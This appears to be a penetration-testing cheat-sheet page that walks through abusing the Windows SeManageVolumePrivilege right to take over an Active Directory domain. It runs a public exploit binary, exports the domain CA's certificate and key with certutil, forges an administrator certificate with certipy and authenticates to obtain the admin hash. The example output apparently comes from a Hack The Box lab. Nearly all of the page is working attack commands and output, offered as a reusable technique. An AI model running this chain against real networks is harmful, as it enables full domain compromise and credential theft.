## Thoery
If an account has `SeManageVolumePrivilege` enable, it can be abused to dump DC CA cert, then create golden certificate.
## Exploit
Check account's privilege
=== "Windows"
    ```bash
    whoami /priv
    ```
    For example
    ```bash
    whoami /priv

    PRIVILEGES INFORMATION
    ----------------------

    Privilege Name                Description                      State
    ============================= ================================ =======
    SeMachineAccountPrivilege     Add workstations to domain       Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
    SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
    ```
Exploit `SeManageVolumePrivilege` by using this [exploit](https://github.com/CsEnox/SeManageVolumeExploit)
=== "Windows"
    ```bash
    .\SeManageVolumeExploit.exe
    ```
    Example:
    ```bash
    .\SeManageVolumeExploit.exe
    Entries changed: 861

    DONE
    ```
Export CA from DC
=== "Windows"
    ```bash
    certutil -exportPFX my "subject_name" C:\path\to\save
    ```
    Example
    ```bash
    certutil -exportPFX my "Certificate-LTD-CA" C:\Users\Public\ca.pfx

    my "Personal"
    ================ Certificate 2 ================
    Serial Number: 75b2f4bbf31f108945147b466131bdca
    Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
    NotBefore: 11/3/2024 3:55 PM
    NotAfter: 11/3/2034 4:05 PM
    Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Template Name (Certificate Type): CA
    CA Version: V0.0
    Signature matches Public Key
    Root Certificate: Subject matches Issuer
    Template: CA, Root Certification Authority
    Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
    Key Container = Certificate-LTD-CA
    Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
    Provider = Microsoft Software Key Storage Provider
    Signature test passed
    Enter new password for output file C:\Users\Public\ca.pfx:
    Enter new password:
    Confirm new password:
    CertUtil: -exportPFX command completed successfully.
    ```
Forge golden certificate for administrator
=== "UNIX-like"
    ```bash
    certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' -out forced_admin.pfx
    ```
    Example
    ```bash
    certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' -out forced_admin.pfx 
    Certipy v5.0.2 - by Oliver Lyak (ly4k)

    [*] Saving forged certificate and private key to 'forced_admin.pfx'
    [*] Wrote forged certificate and private key to 'forced_admin.pfx
    ```
Authen and get admin hash
=== "UNIX-like"
    ```bash
    certipy-ad auth -pfx forced_admin.pfx -dc-ip 10.10.11.71 -u 'administrator' -domain certificate.htb
    ```
    